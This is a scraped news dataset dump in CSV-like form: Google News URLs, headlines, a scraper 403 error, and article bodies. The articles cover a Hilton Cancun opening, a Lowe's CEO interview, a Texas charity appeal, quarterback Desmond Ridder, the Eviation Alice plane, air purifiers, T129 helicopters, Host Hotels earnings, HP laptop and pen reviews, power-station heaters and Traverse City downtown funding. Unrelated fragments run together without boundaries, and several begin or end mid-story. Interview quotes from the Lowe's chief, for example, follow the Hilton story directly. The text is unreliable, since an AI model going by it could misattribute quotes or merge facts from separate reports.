The Governor of Quintana Roo who attended the event spoke of how much the arrival of such a large hotel meant to the region just a year after many of the hotels in the area were forced to close. “I am very pleased to open a hotel like this” Carlos Joaquín González said “because a little over a year ago we had closed 97% of the hotels of the tourist infrastructure of Quintana Roo”. It is expected that the hotel will bring in around 450 permanent jobs to the area.

Also announced on top of the almost $500 million dollar Hilton Cancun were over 30 new hotel developments across Mexico. Seven of these are expected to be in Quintana Roo. Two of those were announced for the surrounding areas. Along the coast Hilton Tulum will be adding another 750 rooms to the area as well as the Conrad by Hilton.

The new hotel serves as yet more evidence of the massive surge in travel towards Cancun and the greater Quintana Roo region.

I’m not going to get out and start to criticize or educate other companies because I’ve got my hands full right here with 350000 associates that stretch all 50 states and have tons of complexity. What I can tell you about is what Lowe’s has done and I think we’ve made incredible progress. I think we’ve done it because it’s the right thing to do and it’s good for business.

Q. How concerned are you about the omicron variant?

A. We control what we control. So I can’t control the current variant. I can’t control future variants but I can control the health and safety of the associates and the customers. I can control what we do to support our associates. We’re trying to stay laser focused on that. We’re just trying to continue to learn be as agile as possible and try to manage the business throughout these uncertain times.

Q. What’s your vision for online?

A. We want to serve a customer any way they choose to shop. We had an inability to do that when I started over three years ago because our online infrastructure was built on a decade-old platform. If we’ve learned nothing from the pandemic we’ve learned that customers require options and choices on how they choose to shop and any retailer that doesn’t provide those options and choices in a way that take friction points out the customer is going to lose.",https://news.google.com/articles/CBMiW2h0dHBzOi8vd3d3Lm5ld3N3ZWVrLmNvbS8xMS1pbXBvcnRhbnQtdGhpbmdzLXlvdS1uZWVkLXdpbnRlcml6ZS15b3VyLWhvbWUtcmlnaHQtbm93LTE2NTMwNTPSAQA?hl=en-US&gl=US&ceid=US%3Aen,11 Important Things You Need to Winterize Your Right Now,ERROR: Article `download()` failed with 403 Client Error: Forbidden for url: https://www.newsweek.com/11-important-things-you-need-winterize-your-home-right-now-1653053 on URL https://news.google.com/articles/CBMiW2h0dHBzOi8vd3d3Lm5ld3N3ZWVrLmNvbS8xMS1pbXBvcnRhbnQtdGhpbmdzLXlvdS1uZWVkLXdpbnRlcml6ZS15b3VyLWhvbWUtcmlnaHQtbm93LTE2NTMwNTPSAQA?hl=en-US&gl=US&ceid=US%3Aen,https://news.google.com/articles/CBMifWh0dHBzOi8vd3d3LnN0YXRlc21hbi5jb20vc3RvcnkvbmV3cy8yMDIxLzEyLzExL3N0YXRlc21hbi1zZWFzb24tY2FyaW5nLWZhbWlsaWVzLW5lZWQtaG9tZS1pbXByb3ZlbWVudHMtcmVudC1oZWxwLzY0MjYwNzEwMDEv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Statesman Season for Caring families need home improvements rent help,"Six-year-old Seraiyah Sneed can’t talk about her old house without unconsciously rubbing her hands together. Her house burned down the morning of July 29.

“I was looking everywhere for the fire until my Granny told me it was in the bathroom” she said. “... At first it was scary and then I started to cry because I thought my Granny was still in the house.”

As Seraiyah recalled the details of that morning her grandma Diana Sneed 67 laid her hands on those of the small girl to kindly get her to keep her hands still. Seraiyah did for a few seconds then she started to rub her lap.

When Seraiyah’s older sister Jalija talks about the fire she stares at the ground.

“I was asleep and then my Granny woke me up” the 9-year-old said. “She was screaming that the house was on fire the house was on fire. … I came out of the house barefoot — that’s how scared I was.”

These are just a few of the countless ways losing their home has affected the Sneed girls and the rest of their family — invisible scars left by the fire.

The blaze sparked because of faulty wiring around 5 a.m. that summer day and by noon nearly everything Seraiyah Jalija and their Granny owned was destroyed. Their homeowner's insurance had lapsed six days before. At the time of the fire the city had been in the process of helping make improvements to the house.

The Sneeds are one of 12 families featured in the Statesman Season for Caring program which helps hundreds of other families through local nonprofit organizations. The Sneeds were nominated by Meals on Wheels Central Texas.

Since Season for Caring launched this year on Nov. 28 it has raised $207173. The campaign is 41.4% of the way toward meeting the Sheth family match of $500000.

Donations doubled:Sheth family matching $500000 in Season for Caring donations

Many of this year's Season for Caring families need help with housing or home repairs.

About a month after the fire Sneed and her two granddaughters moved into the home of her oldest granddaughter Caitlin Coker who has three sons: 3-year-old King 10-year-old Lamar and 13-year-old Deandre.

CINCINNATI — Bearcats star Desmond Ridder is the most accomplished quarterback in school history.

He's 44-5 as a starter and has guided the University of Cincinnati to back-to-back undefeated regular seasons. He never lost a home game at Nippert Stadium in four seasons.

The list of Ridder's accomplishments certainly doesn't end there but his time as the Bearcats quarterback is coming to an end. With a maximum of two games left in Ridder's college career and the NFL Draft just over four months away analysts have started preparing for the spring.

Nate Tice of The Athletic has Ridder at the top of his quarterback big board.

""I’ve had Desmond Ridder as my QB1 for the 2022 NFL Draft on our Big Board for Bleacher/Report. Watched another crop of games yesterday and it’s only solidified how I feel about him. He’s a legit 1st round QB prospect and think there’s a gap between him and the other QBs"" Tice tweeted. ""A common criticism of Ridder has been accuracy which to be honest… didn’t really show up on 2021 film. He can have a spray or two a game but they look worse cause he can legit rope throws in.""

Ridder could've declared for the NFL Draft last offseason but the decision to stay at Cincinnati looks like it paid off. There's no way he would've gotten first round buzz last year with Trevor Lawrence Zach Wilson Justin Fields Trey Lance and Mac Jones in the running.

The 2022 quarterback class is different and it gives Ridder a legit chance to be the first one selected.

Guiding Cincinnati to a National Championship would certainly help his cause.

""He’s a plus athlete that wants to operate from the pocket. The fact he doesn’t have to use it is a positive because his footwork and eyes are so consistently good. He can read out legit dropback concepts and his pocket movement is a strength. It’s impressive"" Tice tweeted. ""Ridder doesn’t have those flashy plays that are going to make people call him 'the next Mahomes' after they watch YouTube highlights because he’s operating from the pocket so often. He can throw guys open and the off-platform throws are there when he has to make them.""

Ridder has thrown for more touchdowns (87) than any other quarterback in Bearcats' history. He's learned and developed during his time in Cincinnati and has NFL level talent.

He'll be an interesting evaluation for NFL teams but it seems like he'll get first round consideration in the 2022 draft.

The company has recently unveiled the design for the aircraft's executive cabin which boasts a luxurious interior with panoramic windows a fully equipped galley and plenty of space.

Unveiled back in 2017 at the International Paris Air Show Alice is an electric aircraft built to offer passengers a sustainable and quiet solution for regional travels. The plane features the widest cabin in its class having enough room for up to six passengers in the executive layout. It measures 6'4 (193 cm) across and it includes large panoramic windows that allow people to enjoy the spectacular views from above.Designed to offer a comfortable experience it features wide elegant seats that come with plenty of legroom. Each seat has a side panel a foldable table a power outlet and a USB slot. The spacious cabin also has an equally spacious baggage compartment that can be used to store skis golfing equipment or bicycles. Other belongings can be put away in a specially-designed wardrobe.The executive cabin addresses the business plane market. When compared to its jet-fueled counterparts the noise levels are low both during takeoff and at cruising allowing passengers to enjoy the comfort of the cabin.The core technology of this six-passenger plus two-crew member aircraft is completed by a Honeywell advanced fly-by-wire system.""Alice's executive cabin is the epitome of pure all-electric elegance and a magnificent blend of beauty and technology"" said Eviation CEO Omer Bar-Yohay.Alice comes in two more configurations : commuter and cargo. The commuter cabin adds up three more seats while the cargo cabin comes with a temperature-controlled cargo compartment to keep everything safe during the journey.The aircraft is not designed for extended trips but for short-distance regular flights. Even so it boasts game-changing capabilities. Thanks to its two magni650 electric propulsion units Alice can fly at a cruise speed of 253 mph (407 kph) on 506-mile (815-km) distances. It has a payload capacity of 2500 lbs (1134 kg) and it represents a sustainable alternative since it doesn't produce carbon emissions.The plane's battery energy system is a single-volume high-energy density system created with already available technology. This means it does not rely on future updates for flight.Currently the aircraft is gearing up for its maiden flight as it works to get certified by the U.S. Federal Aviation Administration (FAA) and the European Aviation Safety Agency (EASA). Once that happens Alice is expected to enter service in 2024.With the introduction of the new design Eviation also announced that it started taking orders for its all-electric plane. Customer deliveries are set to begin in 2026.",https://news.google.com/articles/CBMiQmh0dHBzOi8vd3d3LmdlYXJwYXRyb2wuY29tL2hvbWUvYTM2MDI2NDY1L2Jlc3QtY2hlYXAtYWlyLXB1cmlmaWVyL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,7 Dirt-Cheap Air Purifiers Because Everyone Deserves Clean Air,"For a minute getting an air purifier was like winning the lottery. All the top-rated options were out of stock and those budget ones made some people hesitant as to why they were still available. Thankfully a number of under-$150 air purifiers are worth the money and some of the brands that make those best-of lists also offer some cheaper units for those on a budget. These won’t clean out your whole home but they are good for targeted air purifying in small rooms. From a $55 air purifier from Ikea to one of the nicest budget units we’ve tested these are the best cheap air purifiers.

Partu BS-03 Air Purifier

Amazon Partu BS-03

For $50 you can’t go wrong with Partu’s BS-03 which offers optimal air purifying in rooms up to 107 square feet. The tiny unit has three stages of filtration and three fan speeds though the highest option is a bit noisy. However once you’ve had it on high for a while you can easily kick it back dow to a slower fan speed which is much quieter.

Ikea Fornuftig Air Purifier

IKEA Fornuftig

Ikea’s $55 air purifier seems too good to be true; not only does it look really good but it also works. It’s kitted with a HEPA-12 filter which blocks 99.95 percent of particles 2.5 microns or larger as well as an odor-fighting filter. While most air purifiers will eat through your wallet because of expensive filters the Fornuftig’s replacements are $10 for the HEPA filter and $5 for the carbon filter. One of the best parts of the air purifier is that you can hang it on the wall because Ikea knows space efficiency is important.",https://news.google.com/articles/CBMiUGh0dHBzOi8vd3d3LnNjcmFtYmxlLm5sL21pbGl0YXJ5LW5ld3MvcGhpbGlwcGluZXMtZmlyc3QtZXhwb3J0LWN1c3RvbWVyLWZvci10MTI50gEA?hl=en-US&gl=US&ceid=US%3Aen,Philippines first export customer for T129,"Philippines first export customer for T129

According to Hukbong Himpapawid ng Pilipinas (PAF Philippine Air Force) commander Lt. Gen. Allen Paredes the air force is expected to receive its first two Turkish Aerospace Industries (TAI) T129 ATAK multi role all weather attack helicopters this month.

The two attack helicopters are part of the current requirement for six T129s but according to Lt. Gen. Allen Paredes the deal could be expanded with another six.

Back in November 2018 the PAF selected the T129 ATAK but it took until May 2021 until the US State Department gave the permission for the export of the US produced parts. The T129 is powered by two LHTEC T800-4A turboshaft engines which are produced through a joint venture between the US firm Honeywell and the British company Rolls-Royce.

The new helicopters will be operated by 15th Strike Wing at Danielo Atienza air base. Scramble Magazine assesses that the T129s will replace some the MD520MG helicopters that are now flying with 20th Attack Squadron which is part of the 15th Strike Wing. This squadron also operates the two AH-1Fs Huey Cobras that were obtained from Jordan in 2019.

The T129 ATAK is a further development of the Italian AgustaWestland A129CBT. The Philippines will be the first export customer of the T129 ATAK.

Bethesda Maryland-based Host Hotels & Resorts ended 2023 with $2.9 billion of available liquidity an amount that President and CEO Jim Risoleo said gives the REIT an advantage in negotiating acquisitions once attractive hotels and resorts hit the market.

""Frankly there just aren't a lot of properties that are currently listed for sale certainly not assets that would interest Host but that's really not slowing us down at all"" Risoleo said. ""We are talking to our competitors in the industry our friends in the industry and others to try to kick deals loose that are Host-type assets.

""We are leaning on our relationships. We're leaning on our reputation on our ability to close deals all-cash and that really gives us a very meaningful competitive advantage. And we believe this is the year to to get the balance sheet to work.""

Ideally the U.S. Federal Reserve will soon announce the first of several interest rate cuts Risoleo said and that will bring sellers out of hibernation.

""It's going to also spark competition for those assets"" that will come to market he said. ""Our point of view is we have the balance sheet; we can do it all. We want to get out there and we want to get ahead of the pack. And I hope over the course of the next several months that we're going to be able to tell you that we've been a net acquirer early in 2024.""

Asked about the wave of commercial mortgage-backed securities maturing this year and next and whether that will drive hotel sales Risoleo said the wall of distress hasn't materialized.

""This year there's about $26 billion of full-service loans that will be maturing and I know that earlier in the pandemic there was a lot of talk of distress"" Risoleo said. ""Frankly we haven't seen it materialize certainly not on assets or markets that would interest us. But we'll continue to track it.

""There may be pressure as we get later into the year because one of the things that other hotel owners are going to have to deal with sooner or later is reinvesting in their portfolio.""

Host is interested in acquiring large hotels and resorts with diverse demand drivers in the group business transient and leisure segments. Risoleo added ""bigger is better for us"" and that acquiring hotels in urban markets might be on the table again.

What's Next for Maui

Host's resorts on Maui — the Hyatt Regency Maui Resort and Spa the Andaz Maui at Wailea Resort and the Fairmont Kea Lani — continue to skew the performance of the REIT's portfolio as leisure demand decreased following the wildfires in August. Yet Host's Maui properties have benefited from a steady source of group demand.

Sourav Ghosh Host's executive vice president and chief financial officer said 2023 was ""the year of group and convention hotel recovery"" adding that group room revenue increased 21% year over year and the volume of group room nights sold recovered to 95% of 2019 levels.

""It is worth noting that our group results were positively skewed by disaster and recovery bookings in Maui"" he said. ""Group room revenue exceeded 2022 by 13% in the fourth quarter driven by an increase in both rate and room nights and we estimate roughly half of that growth can be attributed to recovery and relief groups on Maui.""

article 5 Min Read Host Awaits Return of Consistent Hotel Demand in Maui None of Host Hotels & Resorts' three Maui resorts were damaged by the August wildfires but a significant number of bookings were canceled for the fourth quarter. Dan Kubacki Social

Efforts to rebuild Lahaina are ongoing and Risoleo said the west side of Maui will take more time to recover.

""In the interim we have been working with relief agencies in particular the Red Cross. We have contracted with the Red Cross for 350 rooms at the Hyatt Regency Maui through the end of May and we're hopeful that that will be extended while the recovery moves forward"" Risoleo said.

Host is also awaiting a resolution to Hawaii Gov. Josh Green's threat to ban short-term rentals if they aren't opened up as housing for displaced residents. In December Green said the state needed approximately 3000 short-term rental units set aside for Maui residents.

""March 1 is a pivotal date in our mind"" Risoleo said. ""The governor of the state of Hawaii has stated that if the owners of short-term rentals on Maui don't come to terms with allowing their units to be utilized by the displaced residents then he is considering a ban on short-term rentals. ... On the island of Maui in total there's about 30000 short-term rentals. It's quite significant and we're tracking it very closely.""

Risoleo added he hopes leisure travelers will return sooner to Host's two resorts in the Wailea area: the Andaz Maui at Wailea Resort and the Fairmont Kea Lani. Host concluded 2023 by wrapping up a renovation of the Fairmont Kea Lani's lobby and guestrooms in December.

""We're confident that over time as the consumer begins to understand the differentiation between Wailea which is a completely different submarket than the west side and Ka'anapali that will lead the cadence of business pickup"" he said.

Full-Year Outlook and Earnings Highlights

In its 2024 outlook Host Hotels & Resorts forecasts hotel revenue per available room to grow between 2.5% and 5.5% over 2023. The REIT anticipates net income between $708 million and $794 million and adjusted earnings before interest taxes depreciation and amortization for real estate between $1.59 billion and $1.68 billion.

For full-year 2023 Host's revenue was $5.3 billion up 8.2% over 2022 according to the REIT's earnings release.

Host's full-year net income was $752 million — which was up 17% year over year — and adjusted EBITDAre was $1.6 billion up 8.7% from 2022.

The company's portfolio achieved full-year revenue per available room of $211.71 which was up 8.1% year over year. Average daily rate was $300.66 which was 1.8% above full-year 2022. Hotel occupancy was 70.4% up 6.2% from 2022.

As of publication time Host's stock was trading at $20.48 per share up 5.2% year to date. The Nasdaq Composite Index was up 7% for the same period.

HP Rechargeable Active Pen An excellent inking experience Today's Best Deals $76 from HP

Who should buy this active pen?

Why you can trust Windows Central Our expert reviewers spend hours testing and comparing products and services so you can choose the best for you. Find out more about how we test.

The EliteBook x360 1030 G3 doesn't come with an included pen so if you'd like to take advantage of the touch display and convertible build of the laptop you'll have to buy one separately. If you're interested in drawing sketching or jotting down notes without the need for a keyboard an active pen should be the right accessory for you.

Is it a good time to buy this active pen?

This active pen was designed from the start to work with a select few HP EliteBook and Pro laptops. If you'd like to take advantage of inking capabilities on your x360 1030 G3 there's really nothing stopping you.

HP's Rechargeable Active Pen is your best bet for the EliteBook x360 1030 G3

The HP Rechargeable Active Pen — with part number 4KL69UT — is an ideal addition to the EliteBook x360 1030 G3 for anyone who wants to ditch the keyboard and turn their convertible laptop into a drawing pad. For the artists out there this pen is based on Wacom AES technology and has 4096 levels of pressure sensitivity for a natural drawing experience and it also has tilt support making it far easier to shade in your creations.

With 4096 levels of pressure sensitivity tilt support and seven replacement nibs you're going to get a lot of use out of this pen.

The pen comes with a total of seven replacement nibs — four made from polyacetal (POM) for a hard durable feel and three made from elastomer for more flexibility when writing — and a small tool that makes it easy to swap them out. A rechargeable battery is built into the pen and uses an included USB-C cable to recharge.

Much like the Surface Pen HP's option has the same barrel shape with an eraser button on the back end plus there are two buttons on the side that can be programmed to your liking through an included HP inking app. To help keep track of the pen when on the go a magnet is built into the silo that allows you to snap it onto the side of your EliteBook x360 1030. Walk away without the pen? You'll be notified by sound before you get too far.

Alternative to the HP Rechargeable Active Pen

HP's pen is probably the best option for most people thanks to its design and compatibility but if you're dropping the money on a pen and have more than just an EliteBook x360 1030 sitting around — like a Surface device or two — you might want to invest in something that works on both pieces of hardware.

Wacom Bamboo Ink Works with Wacom AES and Surface hardware Today's Best Deals Check Amazon $70 at Microsoft Reasons to buy + Attaches magnetically to the laptop + Supports tilt for shading + 4096 levels of pressure sensitivity + Comes with replacement nibs + Rechargeable battery inside Reasons to avoid - Hybrid option available

The Bamboo Ink supports Wacom's Universal Pen Framework (UPF) making it compatible with Surface and EliteBook hardware. It has 4096 levels of pressure sensitivity it comes with a set of three extra nibs of varying size and it has two programmable buttons on the side. A pen clip at the top makes it easy to stow securely and it has more of a triangular shape for anyone who dislikes the barrel build of HP's pen.

Bottom line

If you'd like an active pen to match your EliteBook x360 1030 G3 HP's own Rechargeable Active Pen is your best option. It works equally well for jotting down notes or for sketching and drawing (thanks to 4096 levels of pressure sensitivity and tilt support) and a built-in magnet keeps it attached to your laptop when on the move.",https://news.google.com/articles/CBMiNWh0dHBzOi8vYXUucGNtYWcuY29tL2xhcHRvcHMvOTE0MTkvaHAtemJvb2stc3R1ZGlvLWc40gEA?hl=en-US&gl=US&ceid=US%3Aen,HP ZBook Studio G8 - Review 2021,"What do you get when you cross a mobile workstation with a gaming laptop? The HP ZBook Studio G8 (starts at A$4765) is often ordered with one of Nvidia's formerly-known-as-Quadro professional GPUs but is also available with Nvidia gaming graphics like our test unit's GeForce RTX 3070 and its keyboard has RGB rainbow backlighting that would look at home on a deluxe gaming rig. High-frame-rate gamers won't like our Studio's 15.6-inch OLED display which is stunning but limited to a vanilla 60Hz refresh rate but the system adds up to a prize platform for 4K video editors or other digital content creators.

A Unique Part of the Lineup

We've reviewed most of HP's ZBook laptop workstations from the heavyweight flagship ZBook Fury 15 G8 to the ZBook Power G8 that targets engineering students and other budget-minded users. Last year's ZBook Studios had only Nvidia Quadro GPUs with the GeForce version dubbed ZBook Create G7; the eighth generation applies the Studio name to both.

At 3.96 pounds the ZBook Studio G8 is almost as thin and light as the 3.74-pound ZBook Firefly 15 G8 which is billed as HP's trimmest mobile workstation but considerably more powerful. The $1894 base model has an Intel Core i7-11800H CPU 16GB of RAM a 256GB solid-state drive and a 1080p IPS screen backed by Nvidia T1200 graphics.

For $4488 our review unit raises the stakes. It's got an eight-core 2.6GHz (5.0GHz turbo) Core i9-11950H processor 32GB of memory a 2TB NVMe SSD the 8GB GeForce RTX 3070 and an OLED touch screen with 4K (3840-by-2160-pixel) resolution. Another screen choice is the non-touch 4K DreamColor display we raved about in our Fury G8 review whose 120Hz refresh rate makes it the best pick for gamers.

The aluminum-clad HP measures 0.69 by 13.9 by 9.2 inches (HWD) making it minutely bigger but a bit lighter than the Dell Precision 5560 (0.73 by 13.6 by 9.1 inches 4.3 pounds). The top and side screen bezels are thin but there's no flex if you grasp the screen corners or press the keyboard deck; the system has passed MIL-STD 810H torture tests for travel hazards such as shock and vibration. A fingerprint reader in the palm rest and a face-recognition webcam give you two ways to skip typing passwords with Windows Hello though the webcam has no privacy shutter.

Next to the power connector on the Studio's right side are two USB-C ports with Thunderbolt 4 functionality an SD card slot and a mini DisplayPort video output (units with professional GPUs have HDMI instead). The left edge has one USB 3.1 Type-A port an audio jack and a security lock slot.

Take a Good Look

The 4K OLED touch display is a real highlight with sky-high contrast inky blacks and pristine white backgrounds. Fine details are ultra-sharp with no trace of pixelation around the edges of letters and colors are rich and well saturated. Viewing angles are wide and brightness is ample (though I was never tempted to turn it down as I am by the very sunniest screens). Reflections on the touch glass are minimal.

The same Omen Gaming Hub software preinstalled on HP's gaming rigs controls the RGB-backlit keyboard offering static lighting (just the WASD keys say) or multicolor animations and special effects. The keyboard commits the HP cardinal sin of cursor arrow keys arranged in a row instead of inverted T with half-height up and down arrows stacked between full-sized left and right but is otherwise impressive with dedicated Home End Page Up and Page Down keys and a snappy responsive typing feel.

Buttonless touchpads aren't ideal for workstations because many computer-aided design (CAD) and other professional apps make heavy use of right and middle buttons but the ZBook's large pad glides and taps smoothly and takes just the right amount of pressure for a quiet click.

Bang & Olufsen-tuned speakers above the keyboard pump out loud and vivid sound with just a hint of echo at top volume. Bass is surprisingly punchy and it's easy to make out overlapping tracks. HP Audio Control software offers music movie and voice presets and an equalizer plus speaker and microphone noise cancellation.

HP piles on the specialized software with the Windows 10 Pro preload (I was offered the upgrade to Win 11 during testing) bolstered by everything from HP Easy Clean (temporarily freezing the keyboard and touchpad for a rubdown with a disinfecting wipe) to HP QuickDrop for sharing files with a smartphone. Security is a priority with BIOS protection support for the Tile Bluetooth location service to find a missing laptop and HP's sandboxed Sure Click Secure Browser. HP ZCentral Remote Boost lets a distant system use the ZBook's powerful CPU and GPU server-style.

Performance Testing: A Workstation/Creative Clash

Since the ZBook Studio G8 straddles the workstation and creative pros' worlds I chose two of each for our benchmark comparisons. The HP ZBook Fury 15 G8 and Dell Precision 5560 are our Editors' Choice titleholders for full-bore and lightweight mobile workstations respectively while the Lenovo ThinkPad X1 Extreme Gen 4 and Acer ConceptD 5 are 16-inch desktop replacements for image video and multimedia specialists. You can see their basic specs in the table below.

Productivity Tests

The main benchmark of UL's PCMark 10 simulates a variety of real-world productivity and content-creation workflows to measure overall performance for office-centric tasks such as word processing spreadsheeting web browsing and videoconferencing. We also run PCMark 10's Full System Drive test to assess the load time and throughput of a laptop's storage.

Three benchmarks focus on the CPU using all available cores and threads to rate a PC's suitability for processor-intensive workloads. Maxon's Cinebench R23 uses that company's Cinema 4D engine to render a complex scene while Primate Labs' Geekbench 5.4 Pro simulates popular apps ranging from PDF rendering and speech recognition to machine learning. Finally we use the open-source video transcoder HandBrake 1.4 to convert a 12-minute video clip from 4K to 1080p resolution (lower times are better).

Our final productivity test is Puget Systems' PugetBench for Photoshop which uses the Creative Cloud version 22 of Adobe's famous image editor to rate a PC's performance for content creation and multimedia applications. It's an automated extension that executes a variety of general and GPU-accelerated Photoshop tasks ranging from opening rotating resizing and saving an image to applying masks gradient fills and filters.

The ThinkPad X1 Extreme narrowly won our PCMark productivity race a fine showing for a Core i7 going up against Core i9s but it was basically a four-way tie with the Dell almost making it a five-way tie—and all five laptops smashing the 4000-point mark that indicates superb performance for Microsoft Office or Google Workspace. The HP predictably excelled in our CPU tests and placed in the middle of a very fast pack in Photoshop.

Graphics Tests

We test Windows PCs' graphics with two DirectX 12 gaming simulations from UL's 3DMark Night Raid (more modest suitable for laptops with integrated graphics) and Time Spy (more demanding suitable for gaming rigs with discrete GPUs).

We also run two tests from the cross-platform GPU benchmark GFXBench 5 which stresses both low-level routines like texturing and high-level game-like image rendering. The 1440p Aztec Ruins and 1080p Car Chase tests rendered offscreen to accommodate different display resolutions exercise graphics and compute shaders using the OpenGL programming interface and hardware tessellation respectively. The more frames per second (fps) the better.

The ZBook Studio's gaming GPU carried the day in our most demanding gaming simulations (3DMark Time Spy and the two GFXBench tests) with the ZBook Fury close behind. The GeForce RTX 3070 will be a little stressed if you try gaming at 4K resolution but provides out-of-this-world performance at 1080p (though again it deserves a faster-than-60Hz display).

Workstation-Specific Tests

We run two additional programs to simulate workstation applications as well as Adobe Premiere Pro for which we don't have enough results to mention. We changed the lineup because the Acer ConceptD 5 isn't here. The first Blender is an open-source 3D suite for modeling animation simulation and compositing. We record the time it takes for its built-in Cycles path tracer to render two photo-realistic scenes of BMW cars one using the system's CPU and one the GPU (lower times are better).

Perhaps our most important workstation test SPECviewperf 2020 renders rotates and zooms in and out of solid and wireframe models using viewsets from popular independent software vendor (ISV) apps. We run the 1080p resolution tests based on PTC's Creo CAD platform; Autodesk's Maya modeling and simulation software for film TV and games; and Dassault Systemes' SolidWorks 3D rendering package. The more frames per second the better.

Since the Acer ConceptD 5 didn't complete our workstation tests we inserted results from another 15.6-inch flagship the Lenovo ThinkPad P15 Gen 2. The ThinkPad X1 Extreme was an upset winner in the Blender renders while the P15 prevailed in SPECviewperf but the ZBook Studio performed brilliantly as a lightweight alternative to the ZBook Fury.

Battery and Display Tests

We test laptops' battery life by playing a locally stored 720p video file (the open-source Blender movie Tears of SteelTears of Steel) with display brightness at 50% and audio volume at 100%. We make sure the battery is fully charged before the test with Wi-Fi and keyboard backlighting turned off.

We also use a Datacolor SpyderX Elite monitor calibration sensor and software to measure a laptop screen's color saturation—what percentage of the sRGB Adobe RGB and DCI-P3 color gamuts or palettes the display can show—and its 50% and peak brightness in nits (candelas per square meter).

Workstations and creative desktop replacements spend more time plugged in than ultraportable laptops for frequent fliers so these machines' battery life is adequate if not impressive. Competing in a very elite group the Studio's OLED screen delivered dazzling color fidelity and satisfying if not exceptional brightness (the Precision's and Fury's panels shone even brighter).

A Creative Sensation

The HP ZBook Studio G8 comes close to unseating the Dell Precision 5560 for our Editors' Choice award among lightweight mobile workstations but the Dell retains the title for offering double the HP's maximum 32GB of memory and 2TB of storage.

As specified by Eskom’s requirements these header-type HP heaters will range from 12 to 14 meters long with 2 m diameters. Using Steinmüller Africa’s customised designs the heaters will achieve various pressures ranging from 1.5 to 30 MPa and handle very high temperatures between 230 to 300°C.

The project requires six new designs three process and three mechanical which have been developed swiftly despite the challenges posed by Covid-19. To meet the tight design and planning deadlines while also adhering to Covid-19 protocols the Steinmüller Africa team worked 12-hour shifts around the clock some remotely and others in the office. This was all achieved using 3D modelling software Inventor.

Now well-into material procurement phase the company has begun initial fabrication on Tutuka’s HP heaters and Duhva’s are due to follow in the next few months. Receiving the orders in August 2020 and February 2021 Steinmüller Africa expects to complete all HP heaters by 2024 as both power stations’ equipment is reaching mid-life status and require replacements.

Steinmüller Africa completed extensive preparation and testing procedures to ensure Eskom’s exact specifications were met. The engineering team completed various iterations modifying procedures and production of the header to nipple welding. By re-developing their processes of drilling re-aligning fit-up welding Non-Destructive Testing (NDT) and Ultrasonic Testing (UT) the company created a new process and set of protocols based on existing European methodologies.

The company also extensively tested the best-suited machinery to meet requirements when bending snake or serpentine tubes. Automated semi-automated and manual machines were all tried-and-tested for best-fit. Furthermore the tube bending process also required specific heat treatment which is currently being tested and proven in its efficiency.

“All of our pre-fabrication preparation and testing methods are incredibly important to meet our clients’ specific requirements. Through mock-up testing for the header to the nipple welding and heat treatment for tube bending we are now confident that we can deliver top-quality final products” explains Warwick Ham Boiler Process Engineering Group Leader at Steinmüller Africa.

These HP heaters come with both a manufacturing and engineering guarantee which are confirmed by an external reviewer on fabrication and design completions respectively. Steinmüller Africa’s HP heaters are expected to perform for over 30 years which can be extended with the help of their repairs and maintenance services.

Serving the petrochemical power generation sugar and steel industries Steinmüller Africa offers end-to-end solutions for any utility scale company using turbines boilers and HP heaters. The company can also meet any design code including ASME EN British standards API HEI TRD and TEMA. “We engineer design test fabricate and install all necessary boiler and HP heater equipment using our in-house experts and leading services” concludes Patel.

With the help of Oerlikon Automatic Welding and Cojafex Induction Bending machines unique to the African continent alongside other world-class machinery Steinmüller Africa offers a unique set of customised products and services. Additionally with an internal logistics team and crane division which offers load capacities of over 100 tons both materials delivery and on-site installation can be achieved across Africa.",,,

That’s approximately how much time and money is left in the Traverse City Downtown Development Authority’s (DDA’s) TIF 97 plan the primary funding source for improvement projects in the heart of downtown including Front Street and the Warehouse District. At a special strategic meeting Friday DDA board members identified two major projects they hope to complete before the plan ends in June 2028: building Rotary Square and reconstructing the alleys in the 100 and 200 blocks of Front Street. They also discussed pursuing an extension of TIF 97 beyond 2028 to fund the construction of a West Front Street parking deck and several Boardman River improvement projects.

Consultant Megan Motil of Parallel Solutions led board members through a three-hour facilitated session to identify the top priority projects the DDA hopes to finish with the remaining funds and time left in the TIF 97 plan. TIF 97 is one of two tax increment financing districts downtown – the other is TIF 2 which covers Old Town River’s Edge and Midtown – that capture taxes on increasing property values within their boundaries (pictured). Those funds are then used to pay for public improvement projects in the districts serving as the main source of funding for downtown maintenance and enhancements.

TIF 97 is generating roughly $3 million annually in revenues according to DDA CEO Jean Derenzy. With an estimated $15 million available to spend before the plan expires – once administrative costs and other operating expenses are deducted – and over $56 million in possible public improvement projects listed in the DDA plan Derenzy wanted input on narrowing the project list down to a feasible budget range. She said the DDA could issue a six-year bond upfront to cover $15 million in work so projects could begin immediately but said the DDA could not commit to projects beyond that amount or beyond 2028 unless TIF 97 was extended.

Completing Rotary Square – the long-planned civic square slated to be built on the southeast corner of Union and State streets – rose to the top of the board’s priority list. The DDA has already purchased the property from Huntington Bank and received a $1 million gift from Rotary and a $2 million allocation from the state of Michigan toward the project. “When you bought the property you said ‘we’re in’” Mayor Richard Lewis told the board. “We’re going to have to do something.”

Also rising to the top of the priority list was the reconstruction of the north alleys in the 100 and 200 blocks of Front Street. Though a much newer addition to the list of potential projects than Rotary Square the alleys have recently become an urgent priority after consultants flagged serious safety concerns with the deteriorating retaining wall along the Boardman River. As water levels have risen in the last decade the soil underneath the wall has been scoured out leading to “pavement failure sidewalk failure (and) disappearing signs” in the alleys according to SmithGroup. Of greater concern is a large 24-inch sanitary sewer main that sits directly on the top of the river wall foundation and is at risk of failure. The consultants recommended relocating the sewer main away from the wall and closer to the buildings as well as replacing the business service lines connected to the main. Tearing up the alley could give the DDA the opportunity to transform the 200 block section taking out the retaining wall and building a new riverfront plaza and riverwalk providing direct public access to the Boardman. Derenzy said that move is supported by business owners – despite the loss of alley parking – and by the Lower Boardman River Unified Plan a master plan set to be adopted soon by the city that outlines desired river improvements.

